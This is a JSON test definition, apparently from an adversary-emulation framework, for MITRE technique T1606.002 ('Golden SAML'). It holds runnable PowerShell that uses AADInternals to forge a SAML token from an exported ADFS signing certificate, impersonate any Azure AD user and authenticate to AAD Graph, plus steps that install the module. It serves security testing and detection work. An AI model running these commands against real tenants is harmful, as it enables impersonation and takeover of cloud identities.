{
  "id": "b16a03bc-1089-4dcc-ad98-30fe8f3a2b31",
  "name": "Golden SAML",
  "description": "Forge a \"Golden SAML\" token which allows to impersonate any Azure AD user, and authenticate to AADGraph (as a proof). \nYou will need the ADFS token signing certificate (see T1552.004 to export it).\nMore info here : https://o365blog.com/post/adfs/\n",
  "platforms": [
    "azure-ad"
  ],
  "steps": [
    {
      "id": "a35ee0fe-06e5-40ef-b3c4-dbbae583aa43",
      "type": "execute-command",
      "data": {
        "command": "Import-Module AADInternals -Force\n$saml = New-AADIntSAMLToken -ImmutableID \"#{immutable_id}\" -PfxFileName \"#{certificate_path}\" -Issuer \"#{issuer_uri}\"\n$conn = Get-AADIntAccessTokenForAADGraph -SAMLToken $saml -SaveToCache\nif ($conn) { Write-Host \"`nSuccessfully connected as $($conn.User)\" } else { Write-Host \"`nThe connection failed\" }\nWrite-Host \"End of Golden SAML\"",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "9bb14b75-7d81-4ba7-a2f3-62d9f6e58d76",
      "name": "Check dependency 1/1",
      "description": "AADInternals module must be installed.\n",
      "type": "execute-command",
      "data": {
        "command": "if (Get-Module AADInternals) {exit 0} else {exit 1}",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "9993a8b1-9ccd-4c57-bcf8-1a0ae983421b",
      "name": "Resolve dependency 1/1",
      "description": "AADInternals module must be installed.\n",
      "type": "execute-command",
      "data": {
        "command": "Install-Module -Name AADInternals -Force",
        "command_type": "powershell"
      },
      "elevation_required": false
    },
    {
      "id": "a1d3424e-aa63-4d22-a5cf-606fbb0870d2",
      "name": "Re-check dependency 1/1",
      "description": "AADInternals module must be installed.\n",
      "type": "execute-command",
      "data": {
        "command": "if (Get-Module AADInternals) {exit 0} else {exit 1}",
        "command_type": "powershell"
      },
      "elevation_required": false
    }
  ],
  "flows": [
    {
      "s": "9bb14b75-7d81-4ba7-a2f3-62d9f6e58d76",
      "p": "on-success",
      "o": "a35ee0fe-06e5-40ef-b3c4-dbbae583aa43"
    },
    {
      "s": "9bb14b75-7d81-4ba7-a2f3-62d9f6e58d76",
      "p": "on-failure",
      "o": "9993a8b1-9ccd-4c57-bcf8-1a0ae983421b"
    },
    {
      "s": "9993a8b1-9ccd-4c57-bcf8-1a0ae983421b",
      "p": "on-success",
      "o": "a1d3424e-aa63-4d22-a5cf-606fbb0870d2"
    },
    {
      "s": "a1d3424e-aa63-4d22-a5cf-606fbb0870d2",
      "p": "on-failure",
      "o": "a35ee0fe-06e5-40ef-b3c4-dbbae583aa43"
    }
  ],
  "tags": [
    "T1606",
    "T1606.002"
  ],
  "input_arguments": [
    {
      "name": "certificate_path",
      "type": "path",
      "description": "Token signing certificate path. See T1552.004 to export it",
      "value": ".\\ADFS_signing.pfx"
    },
    {
      "name": "immutable_id",
      "type": "string",
      "description": "ImmutableId of the targeted user. It can be obtained with AzureAD powershell module; $(Get-AzureADUser -SearchString \"username\").ImmutableId",
      "value": "aehgdqBTZV50DKQZmNJ8mg=="
    },
    {
      "name": "issuer_uri",
      "type": "string",
      "description": "Issuer URI of the ADFS service",
      "value": "http://contoso.com/adfs/services/trust/"
    }
  ]
}